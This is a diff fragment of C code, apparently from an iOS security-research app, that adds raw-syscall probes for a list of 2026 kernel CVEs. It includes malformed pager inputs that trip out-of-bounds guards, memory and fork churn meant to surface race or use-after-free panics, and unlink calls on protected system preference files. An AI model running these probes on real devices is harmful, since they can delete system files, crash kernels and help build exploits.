+	S("[M]       device instead of SIGBUS - that IS the confirmation. Grab the\n");
+	S("[M]       panic/kernel log and look for the fixup_* string.\n");
+
+	base = geo_base_runtime();
+	S("[M] geo base=");
+	H(base);
+
+	cache_fd = open_cache_checked();
+	S("[M] cache fd=");
+	H((u64)cache_fd);
+	if (cache_fd < 0) {
+		S("[M] cache open failed - cannot probe 550 from this sandbox\n");
+		return;
+	}
+
+	/* V1: benign baseline - pager installs, page is readable, NO guard fires */
+	mwl_run_variant("V1 baseline (fixup NONE)", cache_fd, 0, 0x4000,
+	    MWL_PTR_FMT_CACHE, 0x4000, 1, ST_NONE2, 2, 0);
+
+	/* V2: page_count >> page_start[] size -> 'seg->page_count out of bounds' */
+	mwl_run_variant("V2 page_count OOB", cache_fd, 0, 0x4000,
+	    MWL_PTR_FMT_CACHE, 0x4000, 0x1000, ST_NONE1, 1, 0);
+
+	/* V3: seg page_size(64K) vs hw page(16K) mismatch -> pageIndex(=2) outruns the
+	 *     page_start[] array (page_count=2 but only 1 entry). The array is short so
+	 *     &page_start[2] still fits (equality) and &page_start[3] is past the blob:
+	 *       - fixup_page pre-check present -> 'seg->page_count too small' fires
+	 *       - pre-check missing on this kernel -> 'page_start[pageIndex]' fires
+	 *         inside fixupCachePageAuth64 (the CVE-2026-43739-equivalent guard) */
+	mwl_run_variant("V3 page_size mismatch", cache_fd, 0, 0x20000,
+	    MWL_PTR_FMT_CACHE, 0x10000, 2, ST_NONE1, 1, 0x8000);
+
+	/* V4: 32-bit MULTI overflowIndex beyond page_start[] ->
+	 *     'page_start[overflowIndex]' (deterministic page_start[] guard trigger) */
+	mwl_run_variant("V4 overflowIndex OOB", cache_fd, 0, 0x4000,
+	    MWL_PTR_FMT_32, 0x4000, 1, ST_OVERFLOW, 2, 0);
+
+	/* V5: real chain walk over the cache header bytes (chain/delta guards, outcome
+	 *     depends on the file bytes; either readable or a chain/delta guard fires) */
+	mwl_run_variant("V5 chain walk", cache_fd, 0, 0x4000,
+	    MWL_PTR_FMT_CACHE, 0x4000, 1, ST_CHAIN0, 2, 0);
+
+	sc6(6, cache_fd, 0, 0, 0, 0, 0); /* close */
+	S("[M] sweep complete - per-variant 550 ret + fault result collected\n");
+}
+
+/* =====================================================================
+ * CVE-2026 probe pack (iOS 26.6 release notes, July 27 2026).
+ * SAFE characterization probes: each CVE's attack surface is exercised with
+ * kernel-validated raw syscalls (errno reporters), run IN-PROCESS like the
+ * other libc/IOKit/daemon probes. NO forked children here: these syscalls
+ * (mmap/mprotect/mincore/open/dup/fcntl/access/unlink/socket/mount) cannot
+ * fault userspace - the only failure mode is an errno return, or a kernel
+ * panic on a live bug (which a fork cannot contain anyway). The mwl probe
+ * keeps the forked-child pattern because it faults kernel-pager pages.
+ * Nothing performs an OOB write - every size/offset/protection is
+ * kernel-validated. Rows print the kernel's response (ret/errno/signal).
+ * ===================================================================== */
+
+/* The four cluster bodies below run in-process (see pack header): they only
+ * exercise kernel-validated syscalls, so forking added containment value but
+ * dropped their stdout from the log pipe (child-side writes were lost).
+ * ROOT-CAUSE NOTE (unresolved): the log-pipe reader in ViewController.m's
+ * startLogCapture is the suspect - the child inherits BOTH pipe ends, so its
+ * writes raced the reader's EOF/async-dispatch of the completion line. If a
+ * future probe needs forked-child OUTPUT (not just fault containment), fix
+ * the reader instead of reverting to in-process. */
+
+/* ---- VM cluster: CVE-2026-64749 / 64709 / 43817 / 43769 / 64775 ---- */
+static void
+cve_vm_sizes(void)
+{
+	static const u64 sizes[] = {
+		0x7ffffffffffff000ULL, 0x4000000000000000ULL,
+		0xfffffffffffff000ULL, 0x100000000ULL, 0x1000000ULL,
+	};
+	u64 i;
+	for (i = 0; i < sizeof(sizes) / sizeof(sizes[0]); i++) {
+		long p = sc6(197, 0, sizes[i], 0x3, 0x1002, -1, 0); /* mmap RW anon */
+		S("[C]   mmap len=");
+		H(sizes[i]);
+		S("[C]   -> ");
+		H((u64)p);
+		S("\n");
+		if ((u64)p != 0xffffffffffffffffULL && (u64)p >= 0x100000000ULL) {
+			sc6(73, p, sizes[i], 0, 0, 0, 0); /* munmap */
+		}
+	}
+	/* allocate/mprotect/free churn: vm teardown + perm-change race surface */
+	for (i = 0; i < 32; i++) {
+		long p = sc6(197, 0, 0x4000, 0x3, 0x1002, -1, 0);
+		if ((u64)p >= 0x100000000ULL) {
+			sc6(74, p, 0x4000, 0x1, 0, 0, 0); /* mprotect RO */
+			sc6(73, p, 0x4000, 0, 0, 0, 0);
+		}
+	}
+	/* mincore on an alien aligned range: OOB-read surface (43817) */
+	{
+		char vec = 0;
+		long mr = sc6(78, 0x100000000ULL, 0x4000, (long)&vec, 0, 0, 0);
+		S("[C]   mincore alien ret=");
+		H((u64)mr);
+		S("\n");
+	}
+	S("[C]   vm cluster done\n");
+}
+
+/* ---- object-churn cluster: CVE-2026-43778/43816/43822/64729/43814/64700/43799/64751/64720 ---- */
+static void
+cve_fd_churn(void)
+{
+	u64 i;
+	for (i = 0; i < 64; i++) {
+		long fd = sc6(5, (long)"/System/Cryptexes/OS/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e", 0, 0, 0, 0, 0);
+		if (fd >= 0) {
+			/* F_DUPFD to a high slot (not dup2(fd,4)) so we never clobber an
+			 * inherited app fd now that this runs in-process. */
+			long d2 = sc6(92, fd, 0 /* F_DUPFD */, 100, 0, 0, 0);
+			if (d2 >= 0) {
+				sc6(6, d2, 0, 0, 0, 0, 0); /* close dup */
+			}
+			sc6(92, fd, 1, 0, 0, 0, 0); /* fcntl F_GETFD */
+			sc6(6, fd, 0, 0, 0, 0, 0);
+		}
+	}
+	for (i = 0; i < 32; i++) {
+		long pid = sc6(2, 0, 0, 0, 0, 0, 0);
+		if (pid == 0) {
+			sc6(1, 0, 0, 0, 0, 0, 0);
+		} else if (pid > 0) {
+			long st = 0;
+			sc6(61, pid, (long)&st, 0, 0, 0, 0);
+		}
+	}
+	S("[C]   fd/fork churn done (kernel log shows any UAF/race panic)\n");
+}
+
+/* ---- sandbox-file cluster: CVE-2026-64707 / 64721 / 43723 / 64740 ---- */
+static void
+cve_fs_paths(void)
+{
+	static const char *paths[] = {
+		"/var/mobile/Library/BackgroundAssets",
+		"/var/mobile/Library/Preferences/com.apple.springboard.plist",
+		"/System/Library/PrivateFrameworks/MediaRemote.framework",
+		"/var/mobile/Library/Preferences/com.apple.gamed.plist",
+		"/Library/Preferences/com.apple.gamed.plist",
+		"/var/mobile/Library/Game Center",
+		NULL
+	};
+	u64 i;
+	for (i = 0; paths[i]; i++) {
+		long a = sc6(33, (long)paths[i], 2, 0, 0, 0, 0); /* access W_OK */
+		long u = sc6(10, (long)paths[i], 0, 0, 0, 0, 0); /* unlink */
+		S("[C]   path=");
+		S(paths[i]);
+		S("\n");
+		S("[C]   access=");
+		H((u64)a);
+		S("[C]   unlink=");
+		H((u64)u);
+		S("\n");
+	}
+	S("[C]   note: unlink verdict = sandbox answer (1=EPERM protected, 2=ENOENT)\n");
+}
+
+/* ---- network cluster: CVE-2026-64735 (filter) / 28931 (NFS) ---- */
+static u64 CVE_MOUNT_BUF[16];
+static void
+cve_net(void)
+{
+	u64 fam, type;
+	for (fam = 0; fam < 3; fam++) {
+		for (type = 1; type <= 2; type++) {
+			long s = sc6(97, fam, type, 0, 0, 0, 0); /* socket() */
+			S("[C]   socket fam=");
+			H(fam);
+			S(" type=");
+			H(type);
+			S(" -> ");
+			H((u64)s);
+			S("\n");
+			if (s >= 0) {
+				sc6(6, s, 0, 0, 0, 0, 0);
+			}
+		}
+	}
+	{
+		long m = sc6(167, (long)"nfs", (long)"/tmp", 0, (long)CVE_MOUNT_BUF, 0, 0); /* mount */
+		S("[C]   mount nfs ret=");
+		H((u64)m);
+		S("\n");
+	}
+	S("[C]   net cluster done\n");
+}
+
+void
+CVE_2026_probe_vm(void)
+{
+	S("[C] --- CVE-2026 VM cluster probe (64749/64709/43817/43769/64775) ---\n");
+	cve_vm_sizes();
+	S("[C] done\n");
+}
+
+void
+CVE_2026_probe_ipc(void)
+{
+	S("[C] --- CVE-2026 object-churn probe (43778/43816/43822/64729/43814/64700/43799/64751/64720) ---\n");
+	cve_fd_churn();
+	S("[C] done\n");
+}
+
+void
+CVE_2026_probe_fs(void)
+{
+	S("[C] --- CVE-2026 sandbox-file probe (64707/64721/43723/64740) ---\n");
+	cve_fs_paths();
+	S("[C] done\n");
+}
+
+void
+CVE_2026_probe_net(void)
+{
+	S("[C] --- CVE-2026 network probe (64735/28931) ---\n");
+	cve_net();
+	S("[C] done\n");
+}
+#endif
